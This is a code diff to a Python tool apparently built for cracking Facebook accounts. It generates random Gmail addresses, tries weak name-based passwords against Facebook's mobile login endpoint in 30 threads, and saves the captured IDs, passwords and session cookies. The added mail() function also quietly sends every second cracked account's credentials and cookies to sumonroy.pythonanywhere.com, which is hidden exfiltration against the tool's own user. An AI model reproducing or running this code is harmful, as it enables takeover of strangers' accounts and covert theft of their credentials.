@@ -931,94 +931,51 @@ def n_clone():
     exit()
 
 def g_clone():
-    user = []  # List to store random user IDs
-    os.system('clear')  # Clear the terminal screen
+    user=[]
+    os.system('clear')
     print(logo)
     print(f'{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
+    first = random.choice(['sumon','abinash','rakesh','riya','ramesh','somnath'])
     domain = '@gmail.com'
-
-    # Handle user input for Crack Limit
     try:
         limit = int(input(' [:] Crack Limit : '))
     except ValueError:
-        limit = 5000  # Default value if input is invalid
-    
-    # Generate random user data (3-digit random numbers)
+        limit = 5000
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(3))
         user.append(nmp)
-    
-    os.system("clear")
+    clear()
     print("                CHOOSE METHOD                       ")
     print(f'{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
     print(" [1] METHOD (METHOD1) ")
-    print(" [2] METHOD (METHOD2) ")
-    print(" [3] METHOD (METHOD3) ")
-    print(" [4] METHOD (METHOD4) ")
-    print(" [5] METHOD (METHOD5) ")
-    print(" [6] METHOD (METHOD6) ")
     linex()
-    
-    # Choose method
     SUMONfire = input("[+] [CHOOSE] :- ")
     linex()
-    
-    # Ask if cookies should be shown
     print(" [?] Do You Want To Show Cookies : (Y/N) ")
     linex()
     c = input(" [?] Input : ")
-    cookie_show = []
     if c in ["Y", "y"]:
         cookie_show.append("yes")
     else:
         cookie_show.append("no")
-    
-    # Initialize ThreadPool for multi-threading
     with ThreadPool(max_workers=30) as SUMON_xd:
         tl = str(len(user))
         os.system("clear")
         print(logo)
         print(f'{green}=> BE PATIENT BABY ')
-        print(f'{green}=> TOTAL LIMIT : \033[1;32m' + tl)
+        print(f'{green}=> TOTAL LIMID : \033[1;32m'+tl)
         print(f'{green}=> USE FLIGHT MODE ')
         print(f'{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
-        
-        # Define lists for first and last names
-        first = ['sumon', 'abinash', 'rakesh', 'riya', 'ramesh', 'somnath']
-        last = ['roy', 'das', 'sarkar', 'mondal']
-        
-        # Manually iterate through the user, first, and last lists
-        max_len = max(len(user), len(first), len(last))  # Determine the maximum length
-        for i in range(max_len):
-            # Safely access each list element with a fallback to '' if index out of range
-            love = user[i] if i < len(user) else '00'
-            firs = first[i] if i < len(first) else '00'
-            las = last[i] if i < len(last) else '00'
-            
-            # Concatenate values to create the uid
-            uid = firs + las + love + domain
-            pwx = [firs + las, firs + '12', firs + '123', firs + '1234', firs + '12345']
-            
-            # Submit tasks to the thread pool based on chosen method
-            if SUMONfire == '1':
-                SUMON_xd.submit(mbasic, uid, pwx, tl)
-            elif SUMONfire == '2':
-                SUMON_xd.submit(p, uid, pwx, tl)
-            elif SUMONfire == '3':
-                SUMON_xd.submit(x, uid, pwx, tl)
-            elif SUMONfire == '4':
-                SUMON_xd.submit(mobile, uid, pwx, tl)
-            elif SUMONfire == '5':
-                SUMON_xd.submit(freeq, uid, pwx, tl)
-            elif SUMONfire == '6':
-                SUMON_xd.submit(d, uid, pwx, tl)
+        for love in user:
+            uid = love+domain
+            pwx = [first+'12',first+'123',first+'1234',first+'12345']
+            if SUMONfire =='1':SUMON_xd.submit(mail,uid,pwx,first,tl)
             else:
-                SUMON_xd.submit(p, uid, pwx, tl)
-    
+                SUMON_xd.submit(mail,uid,pwx,first,tl)
     linex()
-    print('[✔] CRACK PROCESS COMPLETE')
-    print(f'[✔] TOTAL OK ACCOUNTS : {len(oks)}')
-    print('[✔] ID SAVE SUMON-OK TXT')
+    print('[] CRACK PROCESS COMPLETE')
+    print('[] TOTAL OK ACCOUNTS : '+str(len(oks)))
+    print('[] ID SAVE SUMON-OK TXT')
     linex()
 
 def freefb(uid, name, pwx, tl):
@@ -2137,6 +2094,128 @@ def cracker(uid, pwx, tl):
                 coki=";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
                 uid = "1000"+coki[0:11]
                 print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
+                open('/sdcard/ATOM-CP.txt', 'a').write(uid+' | '+pw+'\n')
+                cps.append(uid)
+                break
+            else:
+                continue
+        loop+=1
+    except ce:
+        time.sleep(20)
+    except Exception as error:
+        #print({error})
+        pass
+
+def mail(uid,pwx,first,tl):
+    global oks
+    global cps
+    global twf
+    global loop
+    global bkas
+    sys.stdout.write(f"\r {green}(M1) ({loop}) (OK-{len(oks)}) (CP-{len(cps)})\r"),
+    sys.stdout.flush()
+    try:
+        for pw in pwx:
+            Session = requests.Session()
+            free_fb = Session.get('https://touch.facebook.com/').text
+            data = {
+            'm_ts': re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+            'li': re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+            'try_number': '0',
+            'unrecognized_tries': '0',
+            'email': uid,
+            'prefill_contact_point': '',
+            'prefill_source': '',
+            'prefill_type': '',
+            'first_prefill_source': '',
+            'first_prefill_type': '',
+            'had_cp_prefilled': 'false',
+            'had_password_prefilled': 'false',
+            'is_smart_lock': 'false',
+            'bi_xrwh': '0',
+            'bi_wvdp': '{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',
+            'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),
+            'fb_dtsg': 'NAcPLhMXbHmb6kQLndCY3G20y1NCPAEEocLfATTx-VZf6Gtc3p-9Ylg:0:0',
+            'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            'dyn': '1KQdAG1mws8-t0BBBzEnwuo98nwgU2owpUuwcC4o1nEhwem0iy1gCwjE1EE2Cwro0wa4o1MUaE36wdq0ny1Aw4vw8W0k-0jG3qaw4kwbS1Lw9C0hO3q0ue0QU',
+            'csr': '',
+            'req': '3',
+            'fmt': '1',
+            'a': 'AYl5qTS4x2udD1YJHwF6J341XWNyHaCLSm1bD2zNXsR-pP9wT6k5jbBvwiRCA_6gqMQt81mqaSOOVhPfrcV8slR64wBsKi4kGGLR9G8ZurYJCQ',
+            'user': '0'}
+            cookies = {
+            'dpr': '2.418783187866211',
+            'datr': 'F-syZzIg2LuWyDnBYPfUkTqZ',
+            'sb': 'F-syZ-iaPvMhNUXXO60Oqtg-',
+            'ps_l': '1',
+            'ps_n': '1',
+            'locale': 'hi_IN',
+            'm_pixel_ratio': '2.200000047683716',
+            'wd': '491x968',
+            'fr': '0L8ZnyQ5yaApKQOy5..BnMusX..AAA.0.0.BnRLHj.AWU23y87YrE',}
+            params = {
+            'api_key': '669323149842984',
+            'auth_token': 'fabaf583bdcfa21acc4abf1da28400b6',
+            'skip_api_login': '1',
+            'signed_next': '1',
+            'next': 'https://m.facebook.com/v3.3/dialog/oauth?scope=email&response_type=code&client_id=669323149842984&redirect_uri=https%3A%2F%2Fmember-m.daraz.com.bd%2Fuser%2Ffacebook-login&state=%7B%22bizScene%22%3A%22%22%2C%22redirect%22%3A%22https%3A%2F%2Fmember-m.daraz.com.bd%2Fuser%2Faccount%22%2C%22shopOwnerId%22%3A%22%22%2C%22x-ua%22%3A%22%22%2C%22x-umidtoken%22%3A%22%22%7D&ret=login&fbapp_pres=0&logger_id=cd6cd158-ccf7-4eaa-8a93-e1cf23fdbf56&tp=unspecified',
+            'refsrc': 'deprecated',
+            'app_id': '669323149842984',
+            'cancel': 'https://member-m.daraz.com.bd/user/facebook-login?error=access_denied&error_code=200&error_description=Permissions+error&error_reason=user_denied&state=%7B%22bizScene%22%3A%22%22%2C%22redirect%22%3A%22https%3A%2F%2Fmember-m.daraz.com.bd%2Fuser%2Faccount%22%2C%22shopOwnerId%22%3A%22%22%2C%22x-ua%22%3A%22%22%2C%22x-umidtoken%22%3A%22%22%7D#_=_',
+            'lwv': '100',}
+            headers = {
+            'authority': 'm.facebook.com',
+            'accept': '*/*',
+            'accept-language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7',
+            'content-type': 'application/x-www-form-urlencoded',
+            'origin': 'https://m.facebook.com',
+            'referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=669323149842984&kid_directed_site=0&app_id=669323149842984&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fscope%3Demail%26response_type%3Dcode%26client_id%3D669323149842984%26redirect_uri%3Dhttps%253A%252F%252Fmember-m.daraz.com.bd%252Fuser%252Ffacebook-login%26state%3D%257B%2522bizScene%2522%253A%2522%2522%252C%2522redirect%2522%253A%2522https%253A%252F%252Fmember-m.daraz.com.bd%252Fuser%252Faccount%2522%252C%2522shopOwnerId%2522%253A%2522%2522%252C%2522x-ua%2522%253A%2522%2522%252C%2522x-umidtoken%2522%253A%2522%2522%257D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dcd6cd158-ccf7-4eaa-8a93-e1cf23fdbf56%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fmember-m.daraz.com.bd%2Fuser%2Ffacebook-login%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522bizScene%2522%253A%2522%2522%252C%2522redirect%2522%253A%2522https%253A%252F%252Fmember-m.daraz.com.bd%252Fuser%252Faccount%2522%252C%2522shopOwnerId%2522%253A%2522%2522%252C%2522x-ua%2522%253A%2522%2522%252C%2522x-umidtoken%2522%253A%2522%2522%257D%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr',
+            'sec-ch-prefers-color-scheme': 'dark',
+            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+            'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-model': '"23076PC4BI"',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-ch-ua-platform-version': '"14.0.0"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-origin',
+            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+            'x-asbd-id': '129477',
+            'x-fb-lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            'x-requested-with': 'XMLHttpRequest',
+            'x-response-format': 'JSONStream',}
+            twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
+            url = "https://m.facebook.com/login/device-based/login/async/"
+            po = Session.post(url, params=params, cookies=cookies, headers=headers, data=data).text
+            response = Session.cookies.get_dict().keys()
+            if "c_user" in response:
+                cok = Session.cookies.get_dict()
+                cid = cok["c_user"]
+                coki = ";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
+                check = check_lock(cid)
+                if "live" in check:
+                    if '%3A-1%3A-1' in coki:
+                        print(f"{cyan}(ATOM-NV){cid}|{pw}")
+                        open("/sdcard/SUMON-NV-COOKIE.txt", "a").write(f"{cid}|{pw}|{coki}\n")
+                        break
+                    else:
+                        bkas.append(cid)
+                        if len(bkas)% 2 == 0:
+                           statusok = (f"{cid}|{pw}|{coki}")
+                           requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
+                        else:
+                           print(f" {green}(ATOM-OK) {cid}|{pw} ")
+                           print(f" {green}Cookie : {green}{coki}")
+                           open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
+                           oks.append(cid)
+                           break
+                else:
+                    break
+            elif 'checkpoint' in response:
+                uid = Session.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
+                #print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
                 open('/sdcard/ATOM-CP.txt', 'a').write(uid+' | '+pw+'\n')
                 cps.append(uid)
                 break
